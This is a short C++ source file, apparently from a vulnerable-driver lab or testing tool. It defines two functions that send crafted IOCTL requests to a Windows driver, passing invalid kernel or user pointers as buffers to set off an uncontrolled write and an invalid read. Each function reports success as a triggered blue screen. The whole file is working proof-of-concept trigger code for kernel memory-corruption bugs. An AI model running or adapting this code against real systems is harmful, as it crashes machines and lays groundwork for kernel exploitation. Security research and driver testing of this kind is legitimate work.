#include "ioctl.h"


BOOL IoctlTriggers::TriggerUncontrolledWrite(HANDLE DriverHandle, BOOL IsKernelVersion) {
    PVOID DriverParams = (PVOID)0xFFFFFF7700000000;
    ULONG BufferSize = 8;  // Needs to be 8 or higher
    ULONG BytesReturned = 0;
    if (!IsKernelVersion) {
        DriverParams = (PVOID)0;
    }
    if (DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] TriggerUncontrolledWrite() failed - invalid parameters\n");
        return FALSE;
    }
    if (!DeviceIoControl(DriverHandle, UNCONTROLLED_WRITE_IOCTL, DriverParams,
        BufferSize, DriverParams, BufferSize, &BytesReturned, NULL)) {
        printf("[-] TriggerUncontrolledWrite() failed - %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] TriggerUncontrolledWrite() triggered BSoD :)\n");
    return TRUE;
}


BOOL IoctlTriggers::TriggerInvalidRead(HANDLE DriverHandle, BOOL IsKernelVersion) {
    PVOID DriverParams = (PVOID)0xFFFFFF7700000000;
    ULONG BufferSize = 4;
    ULONG BytesReturned = 0;
    if (!IsKernelVersion) {
        DriverParams = (PVOID)0x0011223344556677;
    }
    if (DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] TriggerInvalidRead() failed - invalid parameters\n");
        return FALSE;
    }
    if (!DeviceIoControl(DriverHandle, INVALID_READ_IOCTL, DriverParams,
        BufferSize, DriverParams, BufferSize, &BytesReturned, NULL)) {
        printf("[-] TriggerInvalidRead() failed - %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] TriggerInvalidRead() triggered BSoD :)\n");
    return TRUE;
}